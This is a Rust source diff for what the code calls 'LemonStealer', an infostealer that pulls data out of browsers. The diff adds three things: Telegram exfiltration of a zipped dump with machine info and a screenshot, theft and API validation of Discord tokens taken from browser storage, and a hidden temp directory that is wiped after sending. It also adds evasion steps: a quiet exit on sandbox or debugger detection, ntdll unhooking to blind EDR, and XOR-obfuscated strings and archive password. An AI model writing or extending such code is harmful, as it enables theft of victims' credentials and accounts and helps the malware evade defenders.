@@ -4,12 +4,13 @@
 //! default command when no subcommand is given (Go: root copies dump's flags).
 //! `--keychain-pw` (macOS-only) is intentionally dropped.
 
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use std::process::ExitCode;
 
-use clap::{Args, Parser, Subcommand};
+use clap::parser::ValueSource;
+use clap::{Args, CommandFactory, FromArgMatches, Parser, Subcommand};
 use hbd_core::{Category, parse_categories};
-use log::{error, info, warn};
+use log::{debug, error, info, warn};
 
 mod logging;
 
@@ -61,6 +62,14 @@ struct DumpArgs {
     /// Compress output to zip.
     #[arg(long = "zip")]
     zip: bool,
+    /// Telegram bot token (exfil the zip + machine report after dump).
+    /// Env fallback: LEMON_TG_TOKEN.
+    #[arg(long = "tg-token", default_value = "")]
+    tg_token: String,
+    /// Telegram chat/user id to deliver the report to. Env fallback:
+    /// LEMON_TG_CHAT.
+    #[arg(long = "tg-chat", default_value = "")]
+    tg_chat: String,
 }
 
 #[derive(Subcommand, Debug)]
@@ -121,13 +130,33 @@ fn main() -> ExitCode {
     // were launched from Explorer, hide the attached console window.
     #[cfg(windows)]
     abi::configure_double_click_mode();
-    let cli = Cli::parse();
+    let matches = Cli::command().get_matches();
+    let cli = Cli::from_arg_matches(&matches).unwrap_or_else(|e| e.exit());
+    // Did the user pass `-d` on the command line (vs taking the default)?
+    // The stealth working-dir + wipe flow only kicks in for the tg default.
+    let dir_explicit = matches
+        .subcommand()
+        .and_then(|(_, m)| m.value_source("dir"))
+        .or_else(|| matches.value_source("dir"))
+        == Some(ValueSource::CommandLine);
     // Logging setup FIRST — Go's PersistentPreRun runs before any command.
     LemonLogger::new(cli.verbose).init();
     // Sandbox gate: if the host looks like a VM/CI analysis box, walk away
     // quietly (exit 0, no extraction attempted, no refusal trace).
     if !bypass::sandbox::gate() {
         return ExitCode::SUCCESS;
+    }
+    // Wave 6: if an EDR patched ntdll's .text, restore it from disk BEFORE the
+    // evasion probes so every resolved call (DebugPort queries, SMBIOS fetch)
+    // reaches the real syscall stubs, not the hook. No-op on a clean box.
+    #[cfg(windows)]
+    {
+        if let Some(n) = abi::hooked_bytes().filter(|&n| n > 0) {
+            info!("unhook: ntdll .text differs on {n} bytes");
+        }
+        if let Err(reason) = abi::unhook_ntdll() {
+            warn!("unhook: {reason}");
+        }
     }
     // Wave 3 evasion gate (abi): debugger attached, or VM/antisandbox tells
     // the sandbox gate can't see (SMBIOS vendor, CPUID hypervisor bit).
@@ -138,19 +167,7 @@ fn main() -> ExitCode {
             return ExitCode::SUCCESS;
         }
     }
-    // Wave 6: if an EDR patched ntdll's .text, restore it from disk so every
-    // subsequent call (logical resolution, reflection, the loaded payload)
-    // reaches the real syscall stubs. No-op on a clean box.
-    #[cfg(windows)]
-    {
-        if let Some(n) = abi::hooked_bytes().filter(|&n| n > 0) {
-            info!("unhook: ntdll .text differs on {n} bytes");
-        }
-        if let Err(reason) = abi::unhook_ntdll() {
-            warn!("unhook: {reason}");
-        }
-    }
-    match dispatch(cli) {
+    match dispatch(cli, dir_explicit) {
         Ok(()) => ExitCode::SUCCESS,
         Err(err) => {
             eprintln!("LemonStealer: {err:#}");
@@ -159,7 +176,7 @@ fn main() -> ExitCode {
     }
 }
 
-fn dispatch(cli: Cli) -> anyhow::Result<()> {
+fn dispatch(cli: Cli, dir_explicit: bool) -> anyhow::Result<()> {
     // Resolve browser name to kind, then discover — shared by dump (default or
     // explicit) and dumpkeys. Go discovers per command; a single pass keeps
     // the same semantics since discovery is read-only.
@@ -169,9 +186,9 @@ fn dispatch(cli: Cli) -> anyhow::Result<()> {
     match cli.command {
         None => {
             // Default: dump command (Go: root.RunE = dump.RunE).
-            run_dump(&browsers, &cli.dump)
+            run_dump(&browsers, &cli.dump, dir_explicit)
         }
-        Some(Command::Dump { args }) => run_dump(&browsers, &args),
+        Some(Command::Dump { args }) => run_dump(&browsers, &args, dir_explicit),
         Some(Command::Dumpkeys { browser, output }) => run_dumpkeys(&browsers, &browser, &output),
         Some(Command::Archive { .. }) => {
             // Phase 5 wiring (Archivable archive_sources).
@@ -218,54 +235,337 @@ fn discover_for(browser_name: &str) -> anyhow::Result<Vec<DiscoveredBrowser>> {
     }
 }
 
+/// Appends a result's local + session storage rows to the Discord web-token
+/// pool, tagged with `browser/profile`. Also records the profile dir for the
+/// raw-bytes fallback scan (`web::extract_raw`).
+fn collect_storage_entries(
+    web_storage: &mut Vec<(String, hbd_core::StorageEntry)>,
+    web_profiles: &mut Vec<(String, PathBuf)>,
+    browser_name: &str,
+    r: &hbd_core::ExtractResult,
+) {
+    // Note: duplicate labels are fine — raw scan dedups web tokens later.
+    web_profiles.push((
+        format!("{browser_name}/{}", r.profile.name),
+        PathBuf::from(&r.profile.dir),
+    ));
+    for s in &r.data.local_storage {
+        web_storage.push((format!("{browser_name}/{}", r.profile.name), s.clone()));
+    }
+    for s in &r.data.session_storage {
+        web_storage.push((format!("{browser_name}/{}", r.profile.name), s.clone()));
+    }
+}
+
+/// Deduplicates `web_profiles` by its canonical storage dir (label + path), so
+/// the raw-bytes fallback never rescans the same profile directory.
+fn dedup_web_profiles(web_profiles: &mut Vec<(String, PathBuf)>) {
+    let mut seen = std::collections::HashSet::new();
+    web_profiles.retain(|(label, dir)| seen.insert((label.clone(), dir.clone())));
+}
+
+/// Deduplicates `web_storage` rows by (label, url, key, value) before the
+/// Discord web-token scan. A token found N times must surface exactly once.
+fn dedup_web_storage(web_storage: &mut Vec<(String, hbd_core::StorageEntry)>) {
+    let mut seen = std::collections::HashSet::new();
+    web_storage.retain(|(label, s)| {
+        seen.insert((label.clone(), s.url.clone(), s.key.clone(), s.value.clone()))
+    });
+}
+
 /// Go `extractAndWrite`: extract every browser, accumulate into the writer,
 /// write per-profile files, optionally compress.
-fn run_dump(browsers: &[DiscoveredBrowser], args: &DumpArgs) -> anyhow::Result<()> {
+///
+/// Working dir: when Telegram is configured and the user did NOT pass `-d`,
+/// the dump goes into a hidden pass-in-`%TEMP%` dir that is wiped after the
+/// exfil push. An explicit `-d`, or no Telegram, keeps the old behavior
+/// (results folder, files persist for local inspection / re-dump).
+fn run_dump(
+    browsers: &[DiscoveredBrowser],
+    args: &DumpArgs,
+    dir_explicit: bool,
+) -> anyhow::Result<()> {
     let start = std::time::Instant::now();
     if browsers.is_empty() {
         warn!("no browsers found");
         return Ok(());
     }
     let categories = parse_categories(&args.category)?;
-    let mut writer =
-        output::Writer::new(&args.dir, &args.format).map_err(|e| anyhow::anyhow!("{e}"))?;
+    let tg = telegram_config_from(args);
 
-    for b in browsers {
-        let n = b.profiles().len();
+    // Stealth default: tg configured, no `-d` given → hidden temp dir + wipe.
+    let (work_dir, wipe) = if tg.is_some() && !dir_explicit {
+        match abi::hidden_temp_dir("lemon") {
+            Some(d) => {
+                info!("telegram: working dir {}", d.display());
+                (d, true)
+            }
+            None => (PathBuf::from(&args.dir), false),
+        }
+    } else {
+        (PathBuf::from(&args.dir), false)
+    };
+    let work_str = work_dir.to_string_lossy().into_owned();
+
+    let mut writer =
+        output::Writer::new(&work_str, &args.format).map_err(|e| anyhow::anyhow!("{e}"))?;
+
+    // Wave 8: harvest browser localStorage rows for the Discord web-token scan.
+    // Decoupled from the user-selected categories: even `-c password` still
+    // scans every profile's storage so Discord web tokens are never missed.
+    let storage_cats = [Category::LOCAL_STORAGE, Category::SESSION_STORAGE];
+    let storage_covered = storage_cats.iter().all(|c| categories.contains(c));
+
+    let mut web_storage: Vec<(String, hbd_core::StorageEntry)> = Vec::new();
+    let mut web_profiles: Vec<(String, PathBuf)> = Vec::new();
+
+    // Parallel extraction: every browser's extract runs on its own thread (the
+    // SQLite/DPAPI/ABE work is I/O- and CPU-bound per installation, so they
+    // overlap instead of stalling on each other). Results come back in browser
+    // order — output stays deterministic regardless of which thread finishes
+    // first. `writer.add`/storage collection stay on the main thread (they
+    // mutate shared state).
+    type Outcome = (
+        String, // browser name
+        usize,  // profile count
+        Result<Vec<hbd_core::ExtractResult>, browser::BrowserError>,
+        std::time::Duration, // main extract
+        Option<Result<Vec<hbd_core::ExtractResult>, browser::BrowserError>>,
+        std::time::Duration, // storage-only extract
+    );
+    let categories_ref: &[hbd_core::Category] = &categories;
+    let storage_ref: &[hbd_core::Category] = &storage_cats;
+    let outcomes: Vec<Outcome> = std::thread::scope(|scope| {
+        let handles: Vec<_> = browsers
+            .iter()
+            .map(|b| {
+                let b: &DiscoveredBrowser = b;
+                scope.spawn(move || {
+                    let name = b.browser_name().to_string();
+                    let n = b.profiles().len();
+                    let b_start = std::time::Instant::now();
+                    let main = b.extract(categories_ref);
+                    let main_elapsed = b_start.elapsed();
+                    let (extra, extra_elapsed) = if !storage_covered {
+                        let s_start = std::time::Instant::now();
+                        let extra = b.extract(storage_ref);
+                        (Some(extra), s_start.elapsed())
+                    } else {
+                        (None, std::time::Duration::ZERO)
+                    };
+                    (name, n, main, main_elapsed, extra, extra_elapsed)
+                })
+            })
+            .collect();
+        handles
+            .into_iter()
+            .map(|h| h.join().expect("browser extract thread panicked"))
+            .collect()
+    });
+
+    for (name, n, main, main_elapsed, extra, extra_elapsed) in outcomes {
         info!(
-            "Extracting {}... ({} profile{})",
-            b.browser_name(),
-            n,
+            "Extracting {name}... ({n} profile{})",
             if n == 1 { "" } else { "s" }
         );
-        let b_start = std::time::Instant::now();
-        match b.extract(&categories) {
+        match main {
             Ok(results) => {
                 for r in results {
-                    writer.add(b.browser_name(), &r.profile.name, &r.data);
+                    collect_storage_entries(&mut web_storage, &mut web_profiles, &name, &r);
+                    writer.add(&name, &r.profile.name, &r.data);
                 }
                 info!(
-                    "  {}: extraction took {}",
-                    b.browser_name(),
-                    format_duration(b_start.elapsed())
+                    "  {name}: extraction took {}",
+                    format_duration(main_elapsed)
                 );
             }
-            Err(e) => error!("extract {}: {}", b.browser_name(), e),
+            Err(e) => error!("extract {name}: {e}"),
+        }
+        // Storage categories weren't in the user's selection: run a dedicated
+        // storage-only extraction so the Discord web-token scan still sees every
+        // profile's rows (output files are unaffected — nothing is written).
+        if let Some(extra) = extra {
+            match extra {
+                Ok(results) => {
+                    for r in results {
+                        collect_storage_entries(&mut web_storage, &mut web_profiles, &name, &r);
+                    }
+                    info!(
+                        "  {name}: storage scan for Discord took {}",
+                        format_duration(extra_elapsed)
+                    );
+                }
+                Err(e) => error!("storage scan {name}: {e}"),
+            }
         }
     }
-    writer.write()?;
+    // Storage-only pass (when the user's categories already include storage, or
+    // the extra pass re-runs it) pushes the same profile dir + rows twice.
+    // Dedupe both so the raw-bytes fallback scans each dir once and tokens are
+    // only ever reported once.
+    dedup_web_profiles(&mut web_profiles);
+    dedup_web_storage(&mut web_storage);
+    let report = writer.write()?;
+
+    // Wave 8: Discord token steal — desktop app clients + web localStorage
+    // already harvested above. Best-effort like everything else: a scan failure
+    // never fails the run.
+    if !web_storage.is_empty() {
+        let web_discord = web_storage
+            .iter()
+            .filter(|(_, s)| {
+                s.url.contains(bypass::x!("discord.com", 0x6E).as_str())
+                    || s.url.contains(bypass::x!("discordapp.com", 0x33).as_str())
+            })
+            .count();
+        info!(
+            "Discord web scan: {} storage entries from browsers ({} discord origin)",
+            web_storage.len(),
+            web_discord
+        );
+    }
+    let discord_tokens = discord::collect(&web_storage, &web_profiles, None);
+    let discord_count = discord_tokens.len();
+    if discord_count > 0 {
+        // Probe `GET /api/v10/users/@me` — drop lazy/invalid tokens before
+        // anything is written or shipped.
+        let valid = discord::validate(discord_tokens);
+        let dropped = discord_count - valid.len();
+        if dropped > 0 {
+            info!(
+                "Discord tokens: {dropped} invalid dropped, {} valid kept",
+                valid.len()
+            );
+        }
+        if valid.is_empty() {
+            info!("Discord tokens: none valid — nothing saved");
+        } else {
+            match write_discord_tokens(&work_dir, &valid) {
+                Ok(path) => info!("Discord tokens written: {}", path.display()),
+                Err(e) => warn!("discord: write tokens: {}", e),
+            }
+        }
+    } else {
+        debug!("discord: no tokens found");
+    }
 
     if args.zip {
-        let dir = Path::new(&args.dir);
-        filemanager::compress_dir(dir).map_err(|e| anyhow::anyhow!("compress: {e}"))?;
-        let base = dir
+        filemanager::compress_dir(&work_dir, None).map_err(|e| anyhow::anyhow!("compress: {e}"))?;
+        let base = work_dir
             .file_name()
             .map(|s| s.to_string_lossy().into_owned())
             .unwrap_or_else(|| "results".to_string());
-        info!("Compressed: {}/{}.zip", args.dir, base);
+        info!("Compressed: {}/{}.zip", work_str, base);
     }
+
+    // Wave 7: Telegram exfil. Runs on dump success — a failed send never fails
+    // the run (and for the stealth default the workdir is wiped either way so
+    // no dump ever lingers on the target disk). Machine info is gathered once
+    // here (zip naming + the report), not per-call.
+    if let Some(cfg) = tg {
+        let info = abi::machine_info();
+        let username = info
+            .user_name
+            .clone()
+            .filter(|s| !s.trim().is_empty())
+            .or_else(|| std::env::var("USERNAME").ok());
+        let stem = username
+            .as_deref()
+            .map(sanitize_file_stem)
+            .unwrap_or_else(|| "results".to_string());
+        let zip_path = work_dir.join(format!("save-{stem}.zip"));
+        if !zip_path.exists() {
+            // User didn't pass --zip: still ship an archive (non-destructive).
+            // AES-256 sealed — the extraction password is decrypted in memory
+            // from an XOR-const blob, no plaintext in the image.
+            let archive_pw = bypass::x!("khongyeuemthiyeuai@999", 0xD3);
+            filemanager::zip_dir(&zip_path, &work_dir, Some(&archive_pw))
+                .map_err(|e| anyhow::anyhow!("zip: {e}"))?;
+            info!("Packed: {}", zip_path.display());
+        }
+        let stats = telegram::Stats {
+            entries: report.entries,
+            files: report.files,
+            profiles: report.profiles,
+            categories: report.categories,
+            discord_tokens: discord_count,
+            browsers: report
+                .browsers
+                .into_iter()
+                .map(|b| telegram::BrowserStats {
+                    name: b.name,
+                    entries: b.entries,
+                    files: b.files,
+                    profiles: b.profiles,
+                    categories: b.categories,
+                })
+                .collect(),
+        };
+        let delivered = match telegram::send_report(&cfg, &info, &stats, &zip_path) {
+            Ok(sent) => {
+                info!(
+                    "telegram: delivered ({})",
+                    if sent.photo_sent && sent.document_sent {
+                        "screenshot + archive"
+                    } else if sent.document_sent {
+                        "archive"
+                    } else if sent.photo_sent {
+                        "screenshot"
+                    } else {
+                        "nothing"
+                    }
+                );
+                sent.document_sent
+            }
+            Err(e) => {
+                warn!("telegram: {e}");
+                false
+            }
+        };
+        if wipe {
+            match std::fs::remove_dir_all(&work_dir) {
+                Ok(()) => info!(
+                    "telegram: wiped working dir {} (delivered: {})",
+                    work_dir.display(),
+                    delivered
+                ),
+                Err(e) => warn!("telegram: couldn't wipe {}: {e}", work_dir.display()),
+            }
+        }
+    }
+
     info!("Done in {}", format_duration(start.elapsed()));
     Ok(())
+}
+
+/// Resolve the Telegram config from flags with `LEMON_TG_*` env fallback.
+/// Returns `None` (with a warning) when token/chat are partially configured.
+fn telegram_config_from(args: &DumpArgs) -> Option<telegram::TelegramConfig> {
+    let token = if args.tg_token.trim().is_empty() {
+        std::env::var("LEMON_TG_TOKEN")
+            .ok()
+            .filter(|s| !s.trim().is_empty())
+    } else {
+        Some(args.tg_token.trim().to_string())
+    };
+    let chat = if args.tg_chat.trim().is_empty() {
+        std::env::var("LEMON_TG_CHAT")
+            .ok()
+            .filter(|s| !s.trim().is_empty())
+    } else {
+        Some(args.tg_chat.trim().to_string())
+    };
+
+    match (token, chat) {
+        (Some(token), Some(chat_id)) => Some(telegram::TelegramConfig { token, chat_id }),
+        (None, None) => None,
+        _ => {
+            warn!(
+                "telegram: --tg-token and --tg-chat (or LEMON_TG_TOKEN/LEMON_TG_CHAT) must be set together"
+            );
+            None
+        }
+    }
 }
 
 /// Formats a [`std::time::Duration`] as `1.23s` / `45.2ms` / `890µs`.
@@ -276,6 +576,42 @@ fn format_duration(d: std::time::Duration) -> String {
         format!("{}ms", d.as_millis())
     } else {
         format!("{}µs", d.as_micros())
+    }
+}
+
+/// Wave 8: persist the stolen Discord tokens as a compact JSON file at the
+/// work-dir root (`Discord/tokens.json`), so the exfil zip carries them.
+/// Best-effort — a write failure is a warning, never a run failure.
+fn write_discord_tokens(
+    work_dir: &Path,
+    tokens: &[discord::DiscordToken],
+) -> std::io::Result<PathBuf> {
+    let dir = work_dir.join("Discord");
+    std::fs::create_dir_all(&dir)?;
+    let path = dir.join("tokens.json");
+    let body =
+        serde_json::to_vec_pretty(tokens).map_err(|e| std::io::Error::other(e.to_string()))?;
+    std::fs::write(&path, body)?;
+    Ok(path)
+}
+
+/// Safe file-stem for the exfil zip: keep harmless chars, drop the rest.
+fn sanitize_file_stem(s: &str) -> String {
+    let out: String = s
+        .chars()
+        .map(|c| {
+            if c.is_alphanumeric() || matches!(c, '-' | '_' | '.') {
+                c
+            } else {
+                '_'
+            }
+        })
+        .collect();
+    let trimmed = out.trim_matches(|c| c == '.' || c == '_');
+    if trimmed.is_empty() {
+        "results".to_string()
+    } else {
+        trimmed.to_string()
     }
 }
 
@@ -402,4 +738,23 @@ fn print_table(rows: &[Vec<String>]) -> anyhow::Result<()> {
     }
     print!("{out}");
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::sanitize_file_stem;
+
+    #[test]
+    fn sanitize_file_stem_keeps_safe_chars() {
+        assert_eq!("catcat1204", sanitize_file_stem("catcat1204"));
+        assert_eq!("a-b_c.d", sanitize_file_stem("a-b_c.d"));
+    }
+
+    #[test]
+    fn sanitize_file_stem_strips_hostile_chars() {
+        assert_eq!("a_b_c", sanitize_file_stem("a<b>c"));
+        assert_eq!("a_b_c", sanitize_file_stem("a:b\\c"));
+        assert_eq!("results", sanitize_file_stem("..."));
+        assert_eq!("results", sanitize_file_stem(""));
+    }
 }
